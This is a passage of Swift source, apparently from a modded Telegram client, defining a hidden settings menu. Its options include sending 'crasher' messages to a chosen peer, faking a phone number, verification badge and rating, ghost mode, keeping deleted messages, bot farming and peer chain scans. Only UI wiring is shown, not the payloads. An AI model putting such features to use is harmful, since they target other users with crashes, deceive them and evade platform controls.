            }
        case .ton:
            if let tonContext = self.controller?.tonContext {
                push(self.context.sharedContext.makeStarsTransactionsScreen(context: self.context, starsContext: tonContext))
            }
        }
    }

    func setupFaqIfNeeded() {
        if !self.didSetCachedFaq {
            self.cachedFaq.set(.single(nil) |> then(cachedFaqInstantPage(context: self.context) |> map(Optional.init)))
            self.didSetCachedFaq = true
        }
    }

    func openFaq(anchor: String? = nil) {
        self.setupFaqIfNeeded()

        let presentationData = self.presentationData
        let progressSignal = Signal<Never, NoError> { [weak self] subscriber in
            let controller = OverlayStatusController(theme: presentationData.theme, type: .loading(cancelled: nil))
            self?.controller?.present(controller, in: .window(.root))
            return ActionDisposable { [weak controller] in
                Queue.mainQueue().async() {
                    controller?.dismiss()
                }
            }
        }
        |> runOn(Queue.mainQueue())
        |> delay(0.15, queue: Queue.mainQueue())
        let progressDisposable = progressSignal.start()

        let _ = (self.cachedFaq.get()
        |> filter { $0 != nil }
        |> take(1)
        |> deliverOnMainQueue).start(next: { [weak self] resolvedUrl in
            progressDisposable.dispose()

            if let strongSelf = self, let resolvedUrl = resolvedUrl {
                var resolvedUrl = resolvedUrl
                if case let .instantView(webPage, _) = resolvedUrl, let customAnchor = anchor {
                    resolvedUrl = .instantView(webPage, customAnchor)
                }
                strongSelf.context.sharedContext.openResolvedUrl(resolvedUrl, context: strongSelf.context, urlContext: .generic, navigationController: strongSelf.controller?.navigationController as? NavigationController, forceExternal: false, forceUpdate: false, openPeer: { peer, navigation in
                }, sendFile: nil, sendSticker: nil, sendEmoji: nil, requestMessageActionUrlAuth: nil, joinVoiceChat: nil, present: { [weak self] controller, arguments in
                    self?.controller?.push(controller)
                }, dismissInput: {}, contentContext: nil, progress: nil, completion: nil)
            }
        })
    }

    private func openTips() {
        let controller = OverlayStatusController(theme: self.presentationData.theme, type: .loading(cancelled: nil))
        self.controller?.present(controller, in: .window(.root))

        let context = self.context
        let navigationController = self.controller?.navigationController as? NavigationController
        self.tipsPeerDisposable.set((self.context.engine.peers.resolvePeerByName(name: self.presentationData.strings.Settings_TipsUsername, referrer: nil)
        |> mapToSignal { result -> Signal<EnginePeer?, NoError> in
            guard case let .result(result) = result else {
                return .complete()
            }
            return .single(result)
        }
        |> deliverOnMainQueue).startStrict(next: { [weak controller] peer in
            controller?.dismiss()
            if let peer = peer, let navigationController = navigationController {
                context.sharedContext.navigateToChatController(NavigateToChatControllerParams(navigationController: navigationController, context: context, chatLocation: .peer(peer)))
            }
        }))
    }
}

private final class EahatGramArguments {
    let context: AccountContext
    let selectPeer: () -> Void
    let sendCrasher: () -> Void
    let sendCrasherDirect: () -> Void
    let addGiftToProfile: () -> Void
    let addCustomGiftToProfile: () -> Void
    let clearGifts: () -> Void
    let removeAllContacts: () -> Void
    let removeAllCalls: () -> Void
    let updateNftUsernameTag: (String) -> Void
    let updateNftUsernamePrice: (String) -> Void
    let addNftUsernameTag: () -> Void
    let updateFakePhoneNumber: (String) -> Void
    let updateFakeRateEnabled: (Bool) -> Void
    let updateFakeRateLevel: (String) -> Void
    let updateFakeVerifyEnabled: (Bool) -> Void
    let openWallpaperPicker: () -> Void
    let updateStarsAmount: (Int32) -> Void
    let addStars: () -> Void
    let updateTargetHudEnabled: (Bool) -> Void
    let updateLiquidGlassEnabled: (Bool) -> Void
    let updateReplyQuoteEnabled: (Bool) -> Void
    let updateGhostModeEnabled: (Bool) -> Void
    let updateFakeOnlineEnabled: (Bool) -> Void
    let updateFakeOnlineBackgroundEnabled: (Bool) -> Void
    let updateSaveDeletedMessagesEnabled: (Bool) -> Void
    let updateSaveEditedMessagesEnabled: (Bool) -> Void
    let updateNoLagsEnabled: (Bool) -> Void
    let updateBogatiUiEnabled: (Bool) -> Void
    let updateHideFailedWarningEnabled: (Bool) -> Void
    let updateSendModeEnabled: (Bool) -> Void
    let updateTranslatorEnabled: (Bool) -> Void
    let selectTranslatorLanguage: () -> Void
    let updateTranslateMyMessagesEnabled: (Bool) -> Void
    let selectTranslateMyMessagesLanguage: () -> Void
    let updateAiAssistantEnabled: (Bool) -> Void
    let selectAiAssistantPeer: () -> Void
    let updateAiAssistantTargetPeerEnabled: (Bool) -> Void
    let updateAiAssistantTargetPeerId: (String) -> Void
    let updateDownFolderEnabled: (Bool) -> Void
    let openCustomUiTheme: () -> Void
    let updateViewUnread2ReadEnabled: (Bool) -> Void
    let updateFarmBotUsername: (String) -> Void
    let updateFarmCommand: (String) -> Void
    let updateFarmInterval: (String) -> Void
    let updateFarmBackgroundEnabled: (Bool) -> Void
    let addFarmJob: () -> Void
    let updateFarmJobEnabled: (Int, Bool) -> Void
    let removeFarmJob: (Int) -> Void
    let updateVoiceModEnabled: (Bool) -> Void
    let selectVoiceModPreset: () -> Void
    let updateVoiceModV2Enabled: (Bool) -> Void
    let selectVoiceModV2Voice: () -> Void
    let updateUseDirectRpc: (Bool) -> Void
    let updateChainPeerId: (String) -> Void
    let updateChainDepth: (String) -> Void
    let updateChainPeerLimit: (String) -> Void
    let updateChainWorkerCount: (String) -> Void
    let openCurrentChainVisualization: () -> Void
    let runChainScan: () -> Void
    let updateFunctestToggle: (Int, Bool) -> Void
    let refreshResponses: () -> Void
    let runGiftProbe: (Int) -> Void
    let showOtherMethod: (Int) -> Void

    init(
        context: AccountContext,
        selectPeer: @escaping () -> Void,
        sendCrasher: @escaping () -> Void,
        sendCrasherDirect: @escaping () -> Void,
        addGiftToProfile: @escaping () -> Void,
        addCustomGiftToProfile: @escaping () -> Void,
        clearGifts: @escaping () -> Void,
        removeAllContacts: @escaping () -> Void,
        removeAllCalls: @escaping () -> Void,
        updateNftUsernameTag: @escaping (String) -> Void,
        updateNftUsernamePrice: @escaping (String) -> Void,
        addNftUsernameTag: @escaping () -> Void,
        updateFakePhoneNumber: @escaping (String) -> Void,
        updateFakeRateEnabled: @escaping (Bool) -> Void,
        updateFakeRateLevel: @escaping (String) -> Void,
        updateFakeVerifyEnabled: @escaping (Bool) -> Void,
        openWallpaperPicker: @escaping () -> Void,
        updateStarsAmount: @escaping (Int32) -> Void,
        addStars: @escaping () -> Void,
        updateTargetHudEnabled: @escaping (Bool) -> Void,
        updateLiquidGlassEnabled: @escaping (Bool) -> Void,
        updateReplyQuoteEnabled: @escaping (Bool) -> Void,
        updateGhostModeEnabled: @escaping (Bool) -> Void,
        updateFakeOnlineEnabled: @escaping (Bool) -> Void,
        updateFakeOnlineBackgroundEnabled: @escaping (Bool) -> Void,
        updateSaveDeletedMessagesEnabled: @escaping (Bool) -> Void,
        updateSaveEditedMessagesEnabled: @escaping (Bool) -> Void,
        updateNoLagsEnabled: @escaping (Bool) -> Void,
        updateBogatiUiEnabled: @escaping (Bool) -> Void,
        updateHideFailedWarningEnabled: @escaping (Bool) -> Void,
        updateSendModeEnabled: @escaping (Bool) -> Void,
        updateTranslatorEnabled: @escaping (Bool) -> Void,
        selectTranslatorLanguage: @escaping () -> Void,
        updateTranslateMyMessagesEnabled: @escaping (Bool) -> Void,
        selectTranslateMyMessagesLanguage: @escaping () -> Void,
        updateAiAssistantEnabled: @escaping (Bool) -> Void,
        selectAiAssistantPeer: @escaping () -> Void,
        updateAiAssistantTargetPeerEnabled: @escaping (Bool) -> Void,
        updateAiAssistantTargetPeerId: @escaping (String) -> Void,
        updateDownFolderEnabled: @escaping (Bool) -> Void,
        openCustomUiTheme: @escaping () -> Void,
        updateViewUnread2ReadEnabled: @escaping (Bool) -> Void,
        updateFarmBotUsername: @escaping (String) -> Void,
        updateFarmCommand: @escaping (String) -> Void,
        updateFarmInterval: @escaping (String) -> Void,
        updateFarmBackgroundEnabled: @escaping (Bool) -> Void,
        addFarmJob: @escaping () -> Void,
        updateFarmJobEnabled: @escaping (Int, Bool) -> Void,
        removeFarmJob: @escaping (Int) -> Void,
        updateVoiceModEnabled: @escaping (Bool) -> Void,
        selectVoiceModPreset: @escaping () -> Void,
        updateVoiceModV2Enabled: @escaping (Bool) -> Void,
        selectVoiceModV2Voice: @escaping () -> Void,
        updateUseDirectRpc: @escaping (Bool) -> Void,
        updateChainPeerId: @escaping (String) -> Void,
        updateChainDepth: @escaping (String) -> Void,
        updateChainPeerLimit: @escaping (String) -> Void,
        updateChainWorkerCount: @escaping (String) -> Void,
        openCurrentChainVisualization: @escaping () -> Void,
        runChainScan: @escaping () -> Void,
        updateFunctestToggle: @escaping (Int, Bool) -> Void,
        refreshResponses: @escaping () -> Void,
        runGiftProbe: @escaping (Int) -> Void,
        showOtherMethod: @escaping (Int) -> Void
    ) {
        self.context = context
        self.selectPeer = selectPeer
        self.sendCrasher = sendCrasher
        self.sendCrasherDirect = sendCrasherDirect
        self.addGiftToProfile = addGiftToProfile
        self.addCustomGiftToProfile = addCustomGiftToProfile
        self.clearGifts = clearGifts
        self.removeAllContacts = removeAllContacts
        self.removeAllCalls = removeAllCalls
        self.updateNftUsernameTag = updateNftUsernameTag
        self.updateNftUsernamePrice = updateNftUsernamePrice
        self.addNftUsernameTag = addNftUsernameTag
        self.updateFakePhoneNumber = updateFakePhoneNumber
        self.updateFakeRateEnabled = updateFakeRateEnabled
        self.updateFakeRateLevel = updateFakeRateLevel
        self.updateFakeVerifyEnabled = updateFakeVerifyEnabled
        self.openWallpaperPicker = openWallpaperPicker
        self.updateStarsAmount = updateStarsAmount
        self.addStars = addStars
        self.updateTargetHudEnabled = updateTargetHudEnabled
        self.updateLiquidGlassEnabled = updateLiquidGlassEnabled
        self.updateReplyQuoteEnabled = updateReplyQuoteEnabled
        self.updateGhostModeEnabled = updateGhostModeEnabled
        self.updateFakeOnlineEnabled = updateFakeOnlineEnabled
        self.updateFakeOnlineBackgroundEnabled = updateFakeOnlineBackgroundEnabled
        self.updateSaveDeletedMessagesEnabled = updateSaveDeletedMessagesEnabled
        self.updateSaveEditedMessagesEnabled = updateSaveEditedMessagesEnabled
        self.updateNoLagsEnabled = updateNoLagsEnabled
        self.updateBogatiUiEnabled = updateBogatiUiEnabled
        self.updateHideFailedWarningEnabled = updateHideFailedWarningEnabled
        self.updateSendModeEnabled = updateSendModeEnabled
        self.updateTranslatorEnabled = updateTranslatorEnabled
        self.selectTranslatorLanguage = selectTranslatorLanguage
        self.updateTranslateMyMessagesEnabled = updateTranslateMyMessagesEnabled
        self.selectTranslateMyMessagesLanguage = selectTranslateMyMessagesLanguage
        self.updateAiAssistantEnabled = updateAiAssistantEnabled
        self.selectAiAssistantPeer = selectAiAssistantPeer
        self.updateAiAssistantTargetPeerEnabled = updateAiAssistantTargetPeerEnabled
        self.updateAiAssistantTargetPeerId = updateAiAssistantTargetPeerId
        self.updateDownFolderEnabled = updateDownFolderEnabled
        self.openCustomUiTheme = openCustomUiTheme
        self.updateViewUnread2ReadEnabled = updateViewUnread2ReadEnabled
        self.updateFarmBotUsername = updateFarmBotUsername
        self.updateFarmCommand = updateFarmCommand
        self.updateFarmInterval = updateFarmInterval
        self.updateFarmBackgroundEnabled = updateFarmBackgroundEnabled
        self.addFarmJob = addFarmJob
        self.updateFarmJobEnabled = updateFarmJobEnabled
        self.removeFarmJob = removeFarmJob
        self.updateVoiceModEnabled = updateVoiceModEnabled
        self.selectVoiceModPreset = selectVoiceModPreset
        self.updateVoiceModV2Enabled = updateVoiceModV2Enabled
        self.selectVoiceModV2Voice = selectVoiceModV2Voice
        self.updateUseDirectRpc = updateUseDirectRpc
        self.updateChainPeerId = updateChainPeerId
        self.updateChainDepth = updateChainDepth
        self.updateChainPeerLimit = updateChainPeerLimit
        self.updateChainWorkerCount = updateChainWorkerCount
        self.openCurrentChainVisualization = openCurrentChainVisualization
        self.runChainScan = runChainScan
        self.updateFunctestToggle = updateFunctestToggle
        self.refreshResponses = refreshResponses
        self.runGiftProbe = runGiftProbe
        self.showOtherMethod = showOtherMethod
    }
}

private enum EahatGramSection: Int32 {
    case controls
    case ai
    case farm
    case functest
    case wallpaper
    case custom
    case stars
    case chain
    case gifts
    case responses
    case other
}

private enum EahatGramTab: Int, Equatable {
    case me
    case test
    case chain
    case ai
    case farm
    case functest
    case walpaper
}

private func eahatGramBogatiUiEnabled(_ settings: ExperimentalUISettings) -> Bool {
    return settings.bogatiUiEnabled
}

private struct EahatGramState: Equatable {
    var selectedTab: EahatGramTab
    var selectedPeerId: EnginePeer.Id?
    var selectedPeerTitle: String
    var targetHudEnabled: Bool
    var liquidGlassEnabled: Bool
    var replyQuoteEnabled: Bool
    var ghostModeEnabled: Bool
    var fakeOnlineEnabled: Bool
    var fakeOnlineBackgroundEnabled: Bool
    var saveDeletedMessagesEnabled: Bool
    var saveEditedMessagesEnabled: Bool
    var noLagsEnabled: Bool
    var bogatiUiEnabled: Bool
    var hideFailedWarningEnabled: Bool
    var sendModeEnabled: Bool
    var translatorEnabled: Bool
    var translatorLanguageCode: String?
    var translateMyMessagesEnabled: Bool
    var translateMyMessagesLanguageCode: String?
    var aiAssistantEnabled: Bool
    var aiAssistantPeerId: EnginePeer.Id?
    var aiAssistantPeerTitle: String
    var aiAssistantTargetPeerEnabled: Bool
    var aiAssistantTargetPeerIdText: String
    var aiAssistantStatusText: String
    var downFolderEnabled: Bool
    var viewUnread2ReadEnabled: Bool
    var farmBotUsernameText: String
    var farmCommandText: String
    var farmIntervalText: String
    var farmBackgroundEnabled: Bool
    var voiceModEnabled: Bool
    var voiceModPreset: String
    var voiceModV2Enabled: Bool
    var voiceModV2Voice: String
    var nftUsernameTagText: String
    var nftUsernamePriceText: String
    var fakePhoneNumberText: String
    var fakeRateEnabled: Bool
    var fakeRateLevelText: String
    var fakeVerifyEnabled: Bool
    var useDirectRpc: Bool
    var starsAmount: Int32
    var chainPeerIdText: String
    var chainDepthText: String
    var chainPeerLimitText: String
    var chainWorkerCountText: String
    var chainStatusText: String
    var hasCurrentChainVisualization: Bool
    var functestSkipReadHistoryEnabled: Bool
    var functestAlwaysDisplayTypingEnabled: Bool
    var functestEnablePWAEnabled: Bool
    var functestDisableImageContentAnalysisEnabled: Bool
    var functestStoriesJpegExperimentEnabled: Bool
    var functestDisableCallV2Enabled: Bool
    var functestEnableVoipTcpEnabled: Bool
    var functestPlayerV2Enabled: Bool
    var functestDisableLanguageRecognitionEnabled: Bool
    var functestDisableReloginTokensEnabled: Bool
    var responses: [String]

    init(liquidGlassEnabled: Bool, replyQuoteEnabled: Bool, ghostModeEnabled: Bool, fakeOnlineEnabled: Bool, fakeOnlineBackgroundEnabled: Bool, saveDeletedMessagesEnabled: Bool, saveEditedMessagesEnabled: Bool, noLagsEnabled: Bool, viewUnread2ReadEnabled: Bool, hasCurrentChainVisualization: Bool, experimentalSettings: ExperimentalUISettings) {
        self.selectedTab = .me
        self.selectedPeerId = nil
        self.selectedPeerTitle = ""
        self.targetHudEnabled = EahatGramDebugSettings.targetHudEnabled.with { $0 }
        self.liquidGlassEnabled = liquidGlassEnabled
        self.replyQuoteEnabled = replyQuoteEnabled
        self.ghostModeEnabled = ghostModeEnabled
        self.fakeOnlineEnabled = fakeOnlineEnabled
        self.fakeOnlineBackgroundEnabled = fakeOnlineBackgroundEnabled
        self.saveDeletedMessagesEnabled = saveDeletedMessagesEnabled
        self.saveEditedMessagesEnabled = saveEditedMessagesEnabled
        self.noLagsEnabled = noLagsEnabled
        self.bogatiUiEnabled = eahatGramBogatiUiEnabled(experimentalSettings)
        self.hideFailedWarningEnabled = experimentalSettings.hideFailedWarning
        self.sendModeEnabled = experimentalSettings.sendMode
        self.translatorEnabled = experimentalSettings.eahatGramTranslatorEnabled
        self.translatorLanguageCode = experimentalSettings.eahatGramTranslatorLanguage
        self.translateMyMessagesEnabled = experimentalSettings.eahatGramTranslateMyMessagesEnabled
        self.translateMyMessagesLanguageCode = experimentalSettings.eahatGramTranslateMyMessagesLanguage
        self.aiAssistantEnabled = experimentalSettings.eahatGramAiAssistantEnabled
        if let aiAssistantChatPeerId = experimentalSettings.eahatGramAiAssistantChatPeerId {
            let peerId = EnginePeer.Id(aiAssistantChatPeerId)
            self.aiAssistantPeerId = peerId
            self.aiAssistantPeerTitle = "peerId=\(peerId.toInt64())"
        } else {
            self.aiAssistantPeerId = nil
            self.aiAssistantPeerTitle = ""
        }
        self.aiAssistantTargetPeerEnabled = experimentalSettings.eahatGramAiAssistantTargetPeerEnabled
        self.aiAssistantTargetPeerIdText = experimentalSettings.eahatGramAiAssistantTargetPeerId.flatMap { value in
            return value > 0 ? "\(value)" : nil
        } ?? ""
        self.aiAssistantStatusText = experimentalSettings.eahatGramAiAssistantEnabled ? "Auto replies enabled" : "Auto replies disabled"
        self.downFolderEnabled = experimentalSettings.foldersTabAtBottom
        self.viewUnread2ReadEnabled = viewUnread2ReadEnabled
        self.farmBotUsernameText = ""
        self.farmCommandText = ""
        self.farmIntervalText = "240"
        self.farmBackgroundEnabled = experimentalSettings.farmBackgroundEnabled
        self.voiceModEnabled = EahatGramDebugSettings.voiceModEnabled.with { $0 }
        self.voiceModPreset = EahatGramDebugSettings.resolvedVoiceModPreset().title
        self.voiceModV2Enabled = EahatGramDebugSettings.voiceModV2Enabled.with { $0 }
        self.voiceModV2Voice = EahatGramDebugSettings.resolvedVoiceModV2Voice().title
        self.nftUsernameTagText = EahatGramDebugSettings.nftUsernameTag.with { $0 }
        self.nftUsernamePriceText = EahatGramDebugSettings.nftUsernamePrice.with { $0 }
        self.fakePhoneNumberText = EahatGramDebugSettings.fakePhoneNumber.with { $0 }
        self.fakeRateEnabled = EahatGramDebugSettings.fakeRateEnabled.with { $0 }
        self.fakeRateLevelText = EahatGramDebugSettings.fakeRateLevel.with { $0 }
        self.fakeVerifyEnabled = EahatGramDebugSettings.fakeVerifyEnabled.with { $0 }
        self.useDirectRpc = true
        self.starsAmount = 100
        self.chainPeerIdText = ""
        self.chainDepthText = "5"
        self.chainPeerLimitText = "5"
        self.chainWorkerCountText = "\(eahatGramGiftChainDefaultConcurrentPeers)"
        self.chainStatusText = "No chain scan started"
        self.hasCurrentChainVisualization = hasCurrentChainVisualization
        self.functestSkipReadHistoryEnabled = experimentalSettings.skipReadHistory
        self.functestAlwaysDisplayTypingEnabled = experimentalSettings.alwaysDisplayTyping
        self.functestEnablePWAEnabled = experimentalSettings.enablePWA
        self.functestDisableImageContentAnalysisEnabled = experimentalSettings.disableImageContentAnalysis
        self.functestStoriesJpegExperimentEnabled = experimentalSettings.storiesJpegExperiment
        self.functestDisableCallV2Enabled = experimentalSettings.disableCallV2
        self.functestEnableVoipTcpEnabled = experimentalSettings.enableVoipTcp
        self.functestPlayerV2Enabled = experimentalSettings.playerV2
        self.functestDisableLanguageRecognitionEnabled = experimentalSettings.disableLanguageRecognition
        self.functestDisableReloginTokensEnabled = experimentalSettings.disableReloginTokens
        self.responses = []
    }
}

private enum EahatGramEntry: ItemListNodeEntry {
    case selectPeer(String)
    case crasher
    case crasherDirect
    case addGiftToProfile
    case addCustomGiftToProfile
    case clearGifts
    case removeAllContacts
    case removeAllCalls
    case nftUsernameTag(String)
    case nftUsernamePrice(String)
    case addNftUsernameTag
    case fakePhoneNumber(String)
    case fakeRate(Bool)
    case fakeRateLevel(String)
    case fakeVerify(Bool)
    case wallpaperInfo(String)
    case openWallpaperPicker
    case starsAmount(Int32)
    case addStars
    case starsStatus(String)
    case targetHud(Bool)
    case liquidGlass(Bool)
    case replyQuote(Bool)
    case ghostMode(Bool)
    case fakeOnline(Bool)
    case fakeOnlineBackground(Bool)
    case saveDeletedMessages(Bool)
    case saveEditedMessages(Bool)
    case noLags(Bool)
    case bogatiUi(Bool)
    case noWarning(Bool)
    case sendMode(Bool)
    case translator(Bool)
    case translatorLanguage(String)
    case translateMyMessages(Bool)
    case translateMyMessagesLanguage(String)
    case aiAssistantEnabled(Bool)
    case aiAssistantPeer(String)
    case aiAssistantTargetPeer(Bool)
    case aiAssistantTargetPeerId(String)
    case aiAssistantStatus(String)
    case downFolder(Bool)
    case customUiTheme
    case viewUnread2Read(Bool)
    case farmBotUsername(String)
    case farmCommand(String)
    case farmInterval(String)
    case farmBackground(Bool)
    case addFarmJob
    case farmJobEnabled(Int, String, Bool)
    case farmJobInfo(Int, String)
    case removeFarmJob(Int, String)
    case voiceMod(Bool)
    case voiceModPreset(String)
    case voiceModV2(Bool)
    case voiceModV2Voice(String)
    case useDirectRpc(Bool)
    case chainPeerId(String)
    case chainDepth(String)
    case chainPeerLimit(String)
    case chainWorkerCount(String)
    case openCurrentChainVisualization
    case runChainScan
    case chainStatus(String)
    case functestInfo(String)
    case functestToggle(Int, String, Bool)
    case refreshResponses
    case noGifts(String)
    case giftsSummary(String)
    case meGift(Int, String)
    case meGiftInfo(Int, String)
    case testGift(Int, String)
    case testGiftInfo(Int, String)
    case noResponses(String)
    case response(Int, String)
    case otherMethod(Int, String)
    case otherMethodInfo(Int, String)

    var section: ItemListSectionId {
        switch self {
        case .selectPeer, .crasher, .crasherDirect, .addGiftToProfile, .clearGifts, .removeAllContacts, .removeAllCalls, .nftUsernameTag, .nftUsernamePrice, .addNftUsernameTag, .fakePhoneNumber, .fakeRate, .fakeRateLevel, .fakeVerify, .targetHud, .liquidGlass, .replyQuote, .ghostMode, .fakeOnline, .fakeOnlineBackground, .saveDeletedMessages, .saveEditedMessages, .noLags, .bogatiUi, .noWarning, .sendMode, .translator, .translatorLanguage, .translateMyMessages, .translateMyMessagesLanguage, .downFolder, .customUiTheme, .viewUnread2Read, .voiceMod, .voiceModPreset, .voiceModV2, .voiceModV2Voice, .useDirectRpc, .refreshResponses:
            return EahatGramSection.controls.rawValue
        case .aiAssistantEnabled, .aiAssistantPeer, .aiAssistantTargetPeer, .aiAssistantTargetPeerId, .aiAssistantStatus:
            return EahatGramSection.ai.rawValue
        case .farmBotUsername, .farmCommand, .farmInterval, .farmBackground, .addFarmJob, .farmJobEnabled, .farmJobInfo, .removeFarmJob:
            return EahatGramSection.farm.rawValue
        case .functestInfo, .functestToggle:
            return EahatGramSection.functest.rawValue
        case .wallpaperInfo, .openWallpaperPicker:
            return EahatGramSection.wallpaper.rawValue
        case .addCustomGiftToProfile:
            return EahatGramSection.custom.rawValue
        case .starsAmount, .addStars, .starsStatus:
            return EahatGramSection.stars.rawValue
        case .chainPeerId, .chainDepth, .chainPeerLimit, .chainWorkerCount, .openCurrentChainVisualization, .runChainScan, .chainStatus:
            return EahatGramSection.chain.rawValue
        case .noGifts, .giftsSummary, .meGift, .meGiftInfo, .testGift, .testGiftInfo:
            return EahatGramSection.gifts.rawValue
        case .noResponses, .response:
            return EahatGramSection.responses.rawValue
        case .otherMethod, .otherMethodInfo:
            return EahatGramSection.other.rawValue
        }
    }

    var stableId: Int {
        switch self {
        case .selectPeer:
            return 100
        case .crasher:
            return 101
        case .crasherDirect:
            return 102
        case .addGiftToProfile:
            return 0
        case .clearGifts:
            return 2
        case .removeAllContacts:
            return 26
        case .removeAllCalls:
            return 27
        case .nftUsernameTag:
            return 3
        case .nftUsernamePrice:
            return 16
        case .addNftUsernameTag:
            return 30
        case .fakePhoneNumber:
            return 11
        case .fakeRate:
            return 23
        case .fakeRateLevel:
            return 24
        case .fakeVerify:
            return 25
        case .wallpaperInfo:
            return 7000000
        case .openWallpaperPicker:
            return 7000001
        case .addCustomGiftToProfile:
            return 1
        case .starsAmount:
            return 200
        case .addStars:
            return 201
        case .starsStatus:
            return 202
        case .targetHud:
            return 4
        case .liquidGlass:
            return 5
        case .replyQuote:
            return 6
        case .ghostMode:
            return 7
        case .fakeOnline:
            return 8
        case .fakeOnlineBackground:
            return 34
        case .saveDeletedMessages:
            return 9
        case .saveEditedMessages:
            return 10
        case .noLags:
            return 14
        case .bogatiUi:
            return 28
        case .noWarning:
            return 31
        case .sendMode:
            return 33
        case .translator:
            return 36
        case .translatorLanguage:
            return 37
        case .translateMyMessages:
            return 38
        case .translateMyMessagesLanguage:
            return 39
        case .aiAssistantEnabled:
            return 8000000
        case .aiAssistantPeer:
            return 8000001
        case .aiAssistantTargetPeer:
            return 8000002
        case .aiAssistantTargetPeerId:
            return 8000003
        case .aiAssistantStatus:
            return 8000004
        case .downFolder:
            return 29
        case .customUiTheme:
            return 32
        case .viewUnread2Read:
            return 15
        case .farmBotUsername:
            return 17
        case .farmCommand:
            return 18
        case .farmInterval:
            return 19
        case .farmBackground:
            return 35
        case .addFarmJob:
            return 20
        case let .farmJobEnabled(index, _, _):
            return 5000000 + index * 3
        case let .farmJobInfo(index, _):
            return 5000000 + index * 3 + 1
        case let .removeFarmJob(index, _):
            return 5000000 + index * 3 + 2
        case .voiceMod:
            return 12
        case .voiceModPreset:
            return 13
        case .voiceModV2:
            return 21
        case .voiceModV2Voice:
            return 22
        case .useDirectRpc:
            return 101
        case .chainPeerId:
            return 103
        case .chainDepth:
            return 104
        case .chainPeerLimit:
            return 105
        case .chainWorkerCount:
            return 106
        case .openCurrentChainVisualization:
            return 107
        case .runChainScan:
            return 108
        case .chainStatus:
            return 109
        case .functestInfo:
            return 110
        case let .functestToggle(index, _, _):
            return 6000000 + index
        case .refreshResponses:
            return 102
        case .noGifts:
            return 400000
        case .giftsSummary:
            return 400001
        case let .meGift(index, _):
            return 1000000 + index * 2
        case let .meGiftInfo(index, _):
            return 1000000 + index * 2 + 1
        case let .testGift(index, _):
            return 2000000 + index * 2
        case let .testGiftInfo(index, _):
            return 2000000 + index * 2 + 1
        case .noResponses:
            return 3000000
        case let .response(index, _):
            return 3000001 + index
        case let .otherMethod(index, _):
            return 4000000 + index * 2
        case let .otherMethodInfo(index, _):
            return 4000000 + index * 2 + 1
        }
    }

    static func ==(lhs: EahatGramEntry, rhs: EahatGramEntry) -> Bool {
        switch lhs {
        case let .selectPeer(lhsText):
            if case let .selectPeer(rhsText) = rhs {
                return lhsText == rhsText
            } else {
                return false
            }
        case .crasher:
            if case .crasher = rhs {
                return true
            } else {
                return false
            }
        case .crasherDirect:
            if case .crasherDirect = rhs {
                return true
            } else {
                return false
            }
        case .addGiftToProfile:
            if case .addGiftToProfile = rhs {
                return true
            } else {
                return false
            }
        case .addCustomGiftToProfile:
            if case .addCustomGiftToProfile = rhs {
                return true
            } else {
                return false
            }
        case .clearGifts:
            if case .clearGifts = rhs {
                return true
            } else {
                return false
            }
        case .removeAllContacts:
            if case .removeAllContacts = rhs {
                return true
            } else {
                return false
            }
        case .removeAllCalls:
            if case .removeAllCalls = rhs {
                return true
            } else {
                return false
            }
        case let .nftUsernameTag(lhsText):
            if case let .nftUsernameTag(rhsText) = rhs {
                return lhsText == rhsText
            } else {
                return false
            }
        case let .nftUsernamePrice(lhsText):
            if case let .nftUsernamePrice(rhsText) = rhs {
                return lhsText == rhsText
            } else {
                return false
            }
        case .addNftUsernameTag:
            if case .addNftUsernameTag = rhs {
                return true
            } else {
                return false
            }
        case let .fakePhoneNumber(lhsText):
            if case let .fakePhoneNumber(rhsText) = rhs {
                return lhsText == rhsText
            } else {
                return false
            }
        case let .fakeRate(lhsValue):
            if case let .fakeRate(rhsValue) = rhs {
                return lhsValue == rhsValue
            } else {
                return false
            }
        case let .fakeRateLevel(lhsText):
            if case let .fakeRateLevel(rhsText) = rhs {
                return lhsText == rhsText
            } else {
                return false
            }
        case let .fakeVerify(lhsValue):
            if case let .fakeVerify(rhsValue) = rhs {
                return lhsValue == rhsValue
            } else {
                return false
            }
        case let .wallpaperInfo(lhsText):
            if case let .wallpaperInfo(rhsText) = rhs {
                return lhsText == rhsText
            } else {
                return false
            }
        case .openWallpaperPicker:
            if case .openWallpaperPicker = rhs {
                return true
            } else {
                return false
            }
        case let .starsAmount(lhsValue):
            if case let .starsAmount(rhsValue) = rhs {
                return lhsValue == rhsValue
            } else {
                return false
            }
        case .addStars:
            if case .addStars = rhs {
                return true
            } else {
                return false
            }
        case let .starsStatus(lhsText):
            if case let .starsStatus(rhsText) = rhs {
                return lhsText == rhsText
            } else {
                return false
            }
        case let .targetHud(lhsValue):
            if case let .targetHud(rhsValue) = rhs {
                return lhsValue == rhsValue
            } else {
                return false
            }
        case let .liquidGlass(lhsValue):
            if case let .liquidGlass(rhsValue) = rhs {
                return lhsValue == rhsValue
            } else {
                return false
            }
        case let .replyQuote(lhsValue):
            if case let .replyQuote(rhsValue) = rhs {
                return lhsValue == rhsValue
            } else {
                return false
            }
        case let .ghostMode(lhsValue):
            if case let .ghostMode(rhsValue) = rhs {
                return lhsValue == rhsValue
            } else {
                return false
            }
        case let .fakeOnline(lhsValue):
            if case let .fakeOnline(rhsValue) = rhs {
                return lhsValue == rhsValue
            } else {
                return false
            }
        case let .fakeOnlineBackground(lhsValue):
            if case let .fakeOnlineBackground(rhsValue) = rhs {
                return lhsValue == rhsValue
            } else {
                return false
            }
        case let .saveDeletedMessages(lhsValue):
            if case let .saveDeletedMessages(rhsValue) = rhs {
                return lhsValue == rhsValue
            } else {
                return false
            }
        case let .saveEditedMessages(lhsValue):
            if case let .saveEditedMessages(rhsValue) = rhs {
                return lhsValue == rhsValue
            } else {
                return false
            }
        case let .noLags(lhsValue):
            if case let .noLags(rhsValue) = rhs {
                return lhsValue == rhsValue
            } else {
                return false
            }
        case let .bogatiUi(lhsValue):
            if case let .bogatiUi(rhsValue) = rhs {
                return lhsValue == rhsValue
            } else {
                return false
            }
        case let .noWarning(lhsValue):
            if case let .noWarning(rhsValue) = rhs {
                return lhsValue == rhsValue
            } else {
                return false
            }
        case let .sendMode(lhsValue):
            if case let .sendMode(rhsValue) = rhs {
                return lhsValue == rhsValue
            } else {
                return false
            }
        case let .translator(lhsValue):
            if case let .translator(rhsValue) = rhs {
                return lhsValue == rhsValue
            } else {
                return false
            }
        case let .translatorLanguage(lhsText):
            if case let .translatorLanguage(rhsText) = rhs {
                return lhsText == rhsText
            } else {
                return false
            }
        case let .translateMyMessages(lhsValue):
            if case let .translateMyMessages(rhsValue) = rhs {
                return lhsValue == rhsValue
            } else {
